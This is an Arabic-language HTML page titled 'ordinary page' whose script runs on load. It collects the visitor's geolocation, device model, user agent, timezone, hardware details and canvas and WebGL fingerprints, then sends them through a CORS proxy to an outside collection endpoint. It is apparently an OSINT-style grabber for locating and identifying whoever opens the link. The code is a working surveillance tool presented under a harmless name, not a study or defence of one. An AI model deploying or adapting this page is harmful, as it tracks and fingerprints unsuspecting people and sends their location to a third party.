<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>صفحة عادية</title>
<style>
body { font-family: Arial, sans-serif; padding: 20px; }
.log { margin: 10px 0; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
.success { background-color: #e0f8e0; border-color: #0a0; }
.error { background-color: #f8e0e0; border-color: #a00; }
</style>
</head>
<body>
<h2>تفاصيل عملية جمع البيانات والإرسال</h2>
<div id="logContainer"></div>

<script>
const logContainer = document.getElementById('logContainer');
function addLog(message, type='') {
    const div = document.createElement('div');
    div.className = 'log ' + type;
    div.textContent = message;
    logContainer.appendChild(div);
}

const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');

// ===== جمع اسم الجهاز =====
async function parseDeviceName(ua) {
    try {
        if (navigator.userAgentData) {
            const hints = await navigator.userAgentData.getHighEntropyValues(["model", "brand"]);
            if (hints?.model) {
                addLog(`اسم الجهاز تم الحصول عليه: ${hints.brand} ${hints.model}`, 'success');
                return `${hints.brand} ${hints.model}`;
            }
        }
    } catch (e) {
        addLog('❌ خطأ أثناء جمع اسم الجهاز: ' + e, 'error');
    }

    const patterns = [
        { name: 'Samsung Galaxy S24', pattern: /samsung.*sm-s92/i },
        { name: 'iPhone 15', pattern: /iphone.*15/i },
        { name: 'Android Device', pattern: /android/i }
    ];
    for (let p of patterns) if (p.pattern.test(ua)) {
        addLog(`اسم الجهاز تم التعرف عليه عبر اليوزر آيجنت: ${p.name}`, 'success');
        return p.name;
    }
    const defaultName = /windows/i.test(ua) ? 'Windows PC' : 'Unknown';
    addLog(`تم استخدام الاسم الافتراضي للجهاز: ${defaultName}`, 'error');
    return defaultName;
}

// ===== جمع الموقع الجغرافي =====
async function getGeolocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            addLog('❌ الموقع الجغرافي غير مدعوم في المتصفح', 'error');
            return resolve({ latitude: null, longitude: null, accuracy_m: 0, error: "غير مدعوم" });
        }
        navigator.geolocation.getCurrentPosition(
            pos => {
                addLog(`تم الحصول على الموقع: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`, 'success');
                resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy_m: pos.coords.accuracy || 0,
                    error: null
                });
            },
            err => {
                addLog('❌ رفض المستخدم أو حدث خطأ أثناء الحصول على الموقع', 'error');
                resolve({ latitude: null, longitude: null, accuracy_m: 0, error: "مرفوض" });
            },
            { timeout: 10000 }
        );
    });
}

// ===== Canvas Fingerprint =====
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('OSINT', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('OSINT', 4, 17);
        addLog('تم إنشاء بصمة Canvas بنجاح', 'success');
        return canvas.toDataURL();
    } catch (e) {
        addLog('❌ خطأ أثناء إنشاء بصمة Canvas: ' + e, 'error');
        return 'خطأ';
    }
}

// ===== WebGL Fingerprint =====
function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) {
            addLog('❌ WebGL غير مدعوم', 'error');
            return 'غير مدعوم';
        }
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        addLog(`تم إنشاء بصمة WebGL: ${renderer}`, 'success');
        return renderer;
    } catch (e) {
        addLog('❌ خطأ أثناء إنشاء بصمة WebGL: ' + e, 'error');
        return 'غير متاح';
    }
}

// ===== Fingerprint عام =====
function generateFingerprint() {
    try {
        const canvas = getCanvasFingerprint();
        const webgl = getWebGLFingerprint();
        const str = `${canvas}${webgl}${navigator.hardwareConcurrency || 0}${screen.colorDepth}`;
        const hash = hashCode(str);
        addLog(`تم إنشاء Fingerprint عام بنجاح: ${hash}`, 'success');
        return hash;
    } catch (e) {
        addLog('❌ خطأ أثناء إنشاء Fingerprint العام: ' + e, 'error');
        return 'خطأ';
    }
}

// ===== hashCode =====
function hashCode(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return hash.toString(16);
}

// ===== التنفيذ =====
(async () => {
    try {
        addLog('جاري جمع بيانات الجهاز والموقع...');
        const [geo, deviceName] = await Promise.all([
            getGeolocation(),
            parseDeviceName(navigator.userAgent)
        ]);
        const fingerprint = generateFingerprint();

        const data = {
            clientUuid: crypto.randomUUID?.() || Date.now().toString(36),
            clientData: "sample",
            deviceFingerprint: fingerprint,
            ipAddress: '',
            userAgent: navigator.userAgent,
            deviceName: deviceName,
            language: navigator.language || 'غير معروف',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            hardwareConcurrency: navigator.hardwareConcurrency || 0,
            deviceMemory: String(navigator.deviceMemory || "unknown"),
            connectionType: navigator.connection?.type ?? 'unknown',
            canvasFingerprint: getCanvasFingerprint().substring(0, 100) + '...',
            webglRenderer: getWebGLFingerprint(),
            geolocation: geo,
            referrer: document.referrer || 'مباشر',
            entryUrl: window.location.href
        };

        addLog('جارٍ إرسال البيانات إلى الخادم...');
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            mode: 'cors'
        });

        if (response.ok) {
            addLog('✅ تم الإرسال بنجاح!', 'success');
        } else {
            addLog(`❌ فشل الإرسال، رمز الحالة: ${response.status}`, 'error');
        }

    } catch (e) {
        addLog('❌ حدث خطأ أثناء جمع البيانات أو الإرسال: ' + e, 'error');
    }
})();
</script>
</body>
</html>
